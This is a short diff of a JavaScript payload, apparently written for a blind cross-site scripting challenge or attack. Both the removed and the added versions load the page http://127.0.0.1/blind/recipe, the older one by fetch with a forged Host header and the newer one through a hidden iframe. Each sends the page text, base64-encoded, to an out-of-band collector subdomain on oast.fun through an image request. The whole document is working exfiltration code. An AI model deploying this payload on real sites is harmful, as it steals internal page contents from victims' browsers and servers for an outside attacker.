@@ -1,10 +1,13 @@
 <script>
-fetch("http://127.0.0.1/blind/recipe", {
-    headers: { "Host": "localhost" }
-})
-.then(r => r.text())
-.then(t => {
-    new Image().src = "https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/?x=" +
-        btoa(unescape(encodeURIComponent(t)));
-});
+var iframe = document.createElement("iframe");
+iframe.src = "http://127.0.0.1/blind/recipe";
+iframe.onload = function () {
+    try {
+        var data = iframe.contentDocument.body.innerText;
+        new Image().src =
+            "https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/?x=" +
+            btoa(unescape(encodeURIComponent(data)));
+    } catch (e) {}
+};
+document.body.appendChild(iframe);
 </script>
